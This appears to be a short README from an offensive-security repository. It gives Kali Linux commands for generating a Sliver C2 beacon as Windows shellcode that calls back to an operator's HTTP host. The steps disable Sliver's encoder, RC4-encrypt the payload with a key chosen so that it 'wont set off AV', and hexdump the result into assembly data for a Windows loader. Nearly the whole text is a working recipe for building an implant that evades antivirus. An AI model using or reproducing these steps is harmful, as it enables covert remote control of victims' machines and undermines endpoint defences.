# Kali Linux Steps
### The below steps assume you have already installed sliver as shown in my sliver-c2 repo.

### - Generate a Sliver beacon as follows:
```
sliver > generate beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --http <ip>, <ip>?driver=wininet --name wutai-http --save /tmp/v1/http.bin -G --skip-symbols
```
```
-G => disable their encoder
--skip-symbols => makes binary smaller
```
- output: /tmp/v1/http.bin

### - Do our own encrypt (use rc4.py from repo)
Use string "advapi32.dll" or something that wont set off AV as key.
```
cd /tmp/v1/
python3 rc4.py advapi32.dll http.bin
```
- output: http.bin.enc

### - Create a file (out.txt) containg a list of ascii hex formatted words (example: dw 05533h) for export to Windows C copilier 
```
hexdump -v -e '1/2 "dw 0%.4xh\n"' http.bin.enc | tee out.txt
```

- out.txt with be used in the assemply file on Windows

### - Copy the contents of the "out.txt" to  Windows Machine where we paste it into a file "data.asm" using "Notepad.exe".